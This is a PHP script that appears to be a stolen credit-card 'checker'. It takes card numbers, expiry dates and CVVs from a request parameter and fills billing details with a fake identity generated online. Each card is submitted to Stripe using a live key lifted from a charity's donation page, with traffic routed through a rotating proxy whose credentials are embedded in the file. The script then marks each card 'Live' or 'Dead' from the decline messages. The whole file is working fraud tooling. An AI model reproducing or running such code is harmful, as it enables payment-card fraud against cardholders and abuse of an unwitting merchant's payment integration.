<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/
$ch = curl_init('');
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'https://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'uemzqptn-rotate:fd8v0wgix25t');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
'Origin: https://js.stripe.com',
'Referer: https://js.stripe.com/'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=c17403d5-62a4-4203-8b8e-4693e52c8ff3342607&muid=96150ae0-7eea-4c59-ae41-069dd69dd7feccb5a2&sid=34704f54-e4ff-4ee0-8dfe-8b200949953d06018c&pasted_fields=number&payment_user_agent=stripe.js%2Ff5d45e036%3B+stripe-js-v3%2Ff5d45e036&time_on_page=89310&key=pk_live_MHwHT7Vz48ZM3cYkKStgXVoa004ck4hoy9');

$c = curl_exec($ch);

$token = trim(strip_tags(getstr($c,'id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.otherminds.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
'Content-Type: application/json; charset=UTF-8',
'Origin: https://www.otherminds.org',
'Referer: https://www.otherminds.org/donate/',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  'action=gfstripe_get_country_code&nonce='.$postcode.'&country='.$country.'&feed_id=4');
$a = curl_exec($ch);
$message = trim(strip_tags(getstr(a,'"message":"','"')));
if (strpos($a, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.')  <br>';
  }
else if(substr_count($c, 'incorrect_number') > 0){
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌  </b>';
  exit();
  }
  
else if (strpos($c, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.')  <br>';
  }





else if (strpos($c, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'()  </b>';
}


else if (strpos($a, "Your card was declined.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'()  </b>';
}


else if (strpos($a, "Your card number is incorrect.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌  </b>';
}

else if (strpos($a, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'()  </b>';
}
else if (strpos($c, "Your card was declined.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'()  </b>';
}
else {
 echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Unknown 🔴 '.$bin.'()  </b>';
}


?>